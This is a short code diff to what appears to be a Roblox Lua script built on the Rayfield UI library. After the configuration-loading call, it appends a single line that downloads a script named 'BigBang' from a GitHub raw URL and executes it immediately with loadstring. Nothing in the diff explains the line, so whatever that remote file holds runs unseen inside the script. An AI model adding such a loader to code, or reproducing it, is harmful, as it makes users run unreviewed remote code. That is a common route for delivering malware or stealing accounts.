@@ -2164,3 +2164,4 @@ task.spawn(function()
 end)
 
 Rayfield:LoadConfiguration()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/CratosHub-Dev/Blow97/refs/heads/main/BigBang"))()
